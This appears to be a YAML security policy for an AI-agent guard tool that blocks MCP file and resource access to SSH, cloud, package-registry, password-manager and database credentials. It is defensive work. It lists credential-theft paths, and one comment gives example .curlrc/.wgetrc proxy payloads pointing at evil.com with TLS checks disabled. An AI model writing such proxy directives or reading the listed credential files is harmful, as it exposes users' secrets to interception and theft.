name: "MCP Secrets & Credentials"
description: "Block MCP tool access to credential files, sensitive directories, and database URIs"
version: "1.0.0"
author: "AgentShield Security Research"

blocked_resources:
  - "file:///home/*/.ssh/**"
  - "file:///root/.ssh/**"
  - "file:///home/*/.aws/**"
  - "file:///root/.aws/**"
  - "file:///home/*/.gnupg/**"
  - "file:///root/.gnupg/**"

rules:
  # === BLOCK: SSH key directory access ===
  - id: mcp-sec-block-ssh-access
    taxonomy: "credential-exposure/private-key-access/ssh-private-key-read"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "write_to_file"
      argument_patterns:
        path: "**/.ssh/**"
    decision: "BLOCK"
    reason: "Access to SSH key directories is blocked."

  # === BLOCK: AWS credential access ===
  - id: mcp-sec-block-aws-access
    taxonomy: "credential-exposure/cloud-credentials/cloud-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "write_to_file"
      argument_patterns:
        path: "**/.aws/**"
    decision: "BLOCK"
    reason: "Access to AWS credential directories is blocked."

  # === BLOCK: GPG key access ===
  - id: mcp-sec-block-gnupg-access
    taxonomy: "credential-exposure/cryptographic-keys/gpg-key-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
      argument_patterns:
        path: "**/.gnupg/**"
    decision: "BLOCK"
    reason: "Access to GPG key directories is blocked."

  # === BLOCK: Kubernetes config access ===
  - id: mcp-sec-block-kube-access
    taxonomy: "credential-exposure/container-config/kubernetes-config-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
      argument_patterns:
        path: "**/.kube/**"
    decision: "BLOCK"
    reason: "Access to Kubernetes config is blocked."

  # === BLOCK: Cloud CLI credentials ===
  - id: mcp-sec-block-gcloud-access
    taxonomy: "credential-exposure/cloud-credentials/cloud-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
      argument_patterns:
        path: "**/.config/gcloud/**"
    decision: "BLOCK"
    reason: "Access to Google Cloud credentials is blocked."

  # === BLOCK: .env file reads ===
  - id: mcp-sec-block-dotenv-read
    taxonomy: "credential-exposure/config-file-access/dotenv-file-read"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
      argument_patterns:
        path: "**/.env"
    decision: "AUDIT"
    reason: ".env file access flagged for review — may contain secrets."

  # === BLOCK: Git credentials ===
  - id: mcp-sec-block-git-credentials
    taxonomy: "credential-exposure/version-control/git-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
      argument_patterns:
        path: "**/.git-credentials"
    decision: "BLOCK"
    reason: "Git credential file access is blocked."

  # === BLOCK: Package manager credential files ===
  # npmrc (user-level) contains //registry.npmjs.org/:_authToken=<secret>
  # pypirc contains plaintext PyPI username/password
  # cargo credentials.toml contains crates.io registry tokens
  # gradle.properties (user-level) can contain Maven/Gradle repository passwords
  # NOTE: .npmrc WRITE is intentionally excluded here. Project-level .npmrc files are legitimately
  # written by agents (e.g., save-exact=true). Shell-level sc-block-npmrc-edit handles malicious
  # registry redirects. Only block READS since any .npmrc (user or project) may hold auth tokens.
  - id: mcp-sec-block-package-manager-creds
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.npmrc"
    decision: "BLOCK"
    reason: "Read access to .npmrc is blocked — contains npm registry auth tokens that could be exfiltrated."

  - id: mcp-sec-block-pypirc
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.pypirc"
    decision: "BLOCK"
    reason: "Access to .pypirc is blocked — contains plaintext PyPI credentials."

  - id: mcp-sec-block-cargo-credentials
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.cargo/credentials.toml"
    decision: "BLOCK"
    reason: "Access to Cargo credentials.toml is blocked — contains crates.io registry tokens."

  - id: mcp-sec-block-gradle-properties
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.gradle/gradle.properties"
    decision: "BLOCK"
    reason: "Access to Gradle user properties is blocked — may contain Maven/Gradle repository passwords."

  # === BLOCK: Helm registry credential files ===
  # ~/.config/helm/repositories.yaml contains repo URLs and passwords
  # ~/.config/helm/registry/config.json contains OCI registry login credentials
  - id: mcp-sec-block-helm-credentials
    taxonomy: "credential-exposure/cloud-credentials/helm-registry-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/helm/**"
    decision: "BLOCK"
    reason: "Access to Helm config directory is blocked — contains OCI registry credentials and repository passwords."

  # === BLOCK: 1Password CLI credential access ===
  - id: mcp-sec-block-1password-cli-access
    taxonomy: "credential-exposure/password-manager/1password-cli-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/op/**"
    decision: "BLOCK"
    reason: "Access to 1Password CLI config directory is blocked — contains session tokens and account credentials."

  # === BLOCK: GNOME Keyring wallet access ===
  - id: mcp-sec-block-gnome-keyring-access
    taxonomy: "credential-exposure/password-manager/gnome-keyring-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.local/share/keyrings/**"
    decision: "BLOCK"
    reason: "Access to GNOME Keyring wallet files is blocked — contains encrypted credential stores."

  # === BLOCK: GitHub Copilot OAuth token access ===
  - id: mcp-sec-block-github-copilot-access
    taxonomy: "credential-exposure/oauth-tokens/github-copilot-token-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/github-copilot/**"
    decision: "BLOCK"
    reason: "Access to GitHub Copilot config is blocked — contains OAuth tokens for GitHub authentication."

  # === BLOCK: Bitwarden CLI data files (issue #636) ===
  # ~/.local/share/bitwarden-cli/data.json — encrypted vault + cached session tokens (XDG data)
  # ~/.config/bitwarden-cli/data.json — config variant on some systems
  - id: mcp-sec-block-bitwarden-cli-access
    taxonomy: "credential-exposure/password-manager/bitwarden-cli-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.local/share/bitwarden-cli/**"
    decision: "BLOCK"
    reason: "Access to Bitwarden CLI data directory is blocked — contains encrypted vault data and cached session tokens."

  - id: mcp-sec-block-bitwarden-cli-config-access
    taxonomy: "credential-exposure/password-manager/bitwarden-cli-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/bitwarden-cli/**"
    decision: "BLOCK"
    reason: "Access to Bitwarden CLI config directory is blocked — contains encrypted vault data and account credentials."

  # === BLOCK: age encryption identity files (issue #637) ===
  # ~/.config/age/keys.txt — age identity file used to decrypt secrets (equivalent to a private key)
  # Used with chezmoi, sops, and age-encrypted secret stores
  - id: mcp-sec-block-age-identity-access
    taxonomy: "credential-exposure/cryptographic-keys/age-identity-key-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/age/**"
    decision: "BLOCK"
    reason: "Access to age encryption identity directory is blocked — age identity files are used to decrypt sensitive data stores (sops, chezmoi)."

  # === BLOCK: curl/wget network proxy configuration writes via MCP (issue #641) ===
  #
  # ~/.curlrc and ~/.wgetrc configure ALL subsequent curl/wget requests system-wide.
  # Writing a malicious proxy directive here routes every future outbound HTTP/HTTPS
  # request — including API tokens, git credentials, and cloud auth — through an
  # attacker-controlled proxy without any shell command or user interaction.
  #
  # Common attack payloads:
  #   .curlrc:  proxy=http://evil.com:8080  +  insecure  (disables TLS verification)
  #   .wgetrc:  http_proxy=http://evil.com:8080  +  check_certificate=off
  #
  # This is MCP-specific because a write_file call bypasses all shell-level rules
  # (sc-block-curlrc-write in terminal-safety.yaml doesn't fire — there's no shell).
  # Reads are intentionally not blocked: learning what proxy is configured is
  # reconnaissance (AUDIT by default), not an immediate exfiltration risk.
  #
  # MITRE T1557   — Adversary-in-the-Middle (proxy intercepts all outbound traffic)
  # MITRE T1071.001 — Application Layer Protocol: Web Protocols
  - id: mcp-sec-block-curlrc-write
    taxonomy: "data-exfiltration/network-exfiltration/network-config-tampering"
    match:
      tool_name_any:
        - "write_file"
        - "create_file"
        - "edit_file"
        - "write_to_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "filesystem_write"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
      argument_patterns:
        path: "**/.curlrc"
    decision: "BLOCK"
    reason: "MCP write to ~/.curlrc — any proxy directive injected here silently intercepts all future curl traffic (including auth tokens and API credentials) via MITM. MITRE T1557."
    confidence: 0.95

  - id: mcp-sec-block-wgetrc-write
    taxonomy: "data-exfiltration/network-exfiltration/network-config-tampering"
    match:
      tool_name_any:
        - "write_file"
        - "create_file"
        - "edit_file"
        - "write_to_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "filesystem_write"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
      argument_patterns:
        path: "**/.wgetrc"
    decision: "BLOCK"
    reason: "MCP write to ~/.wgetrc — any proxy directive injected here silently intercepts all future wget traffic (including auth tokens and credentials) via MITM. MITRE T1557."
    confidence: 0.95

# === Structural rules ===
structural_rules:
  # Block any tool accessing credential paths — catches tool names not in the regex lists
  - id: mcp-struct-block-credential-path-access
    match:
      tool_name_regex: ".*"
      args_match:
        path:
          pattern_any:
            - "\\.ssh/.*"
            - "\\.aws/credentials"
            - "\\.aws/config"
            - "\\.gnupg/"
            - "\\.kube/config"
            - "\\.config/gcloud/"
            - "\\.config/helm/"
            - "\\.cargo/credentials\\.toml"
            - "\\.gradle/gradle\\.properties"
            - "\\.pypirc$"
            - "\\.config/op/"
            - "\\.local/share/keyrings/"
            - "\\.config/github-copilot/"
            - "\\.local/share/bitwarden-cli/"
            - "\\.config/bitwarden-cli/"
            - "\\.config/age/"
    decision: "BLOCK"
    reason: "MCP tool accessing credential/sensitive path detected by structural match"
    confidence: 0.95

resource_rules:
  # === BLOCK: Database URI access ===
  - id: mcp-sec-block-mysql-uri
    taxonomy: "credential-exposure/database-access/database-credential-access"
    match:
      scheme: "mysql"
    decision: "BLOCK"
    reason: "Direct MySQL database access via MCP is blocked."

  - id: mcp-sec-block-postgres-uri
    taxonomy: "credential-exposure/database-access/database-credential-access"
    match:
      scheme: "postgres"
    decision: "BLOCK"
    reason: "Direct PostgreSQL database access via MCP is blocked."

  - id: mcp-sec-block-redis-uri
    taxonomy: "credential-exposure/database-access/database-credential-access"
    match:
      scheme: "redis"
    decision: "BLOCK"
    reason: "Direct Redis access via MCP is blocked."

  - id: mcp-sec-block-mongodb-uri
    taxonomy: "credential-exposure/database-access/database-credential-access"
    match:
      scheme: "mongodb"
    decision: "BLOCK"
    reason: "Direct MongoDB access via MCP is blocked."

  # === BLOCK: Sensitive file URI patterns ===
  - id: mcp-sec-block-ssh-uri
    taxonomy: "credential-exposure/private-key-access/ssh-private-key-read"
    match:
      uri_pattern: "file:///**/.ssh/**"
    decision: "BLOCK"
    reason: "Resource read of SSH key files is blocked."

  - id: mcp-sec-block-aws-uri
    taxonomy: "credential-exposure/cloud-credentials/cloud-credential-access"
    match:
      uri_pattern: "file:///**/.aws/**"
    decision: "BLOCK"
    reason: "Resource read of AWS credential files is blocked."
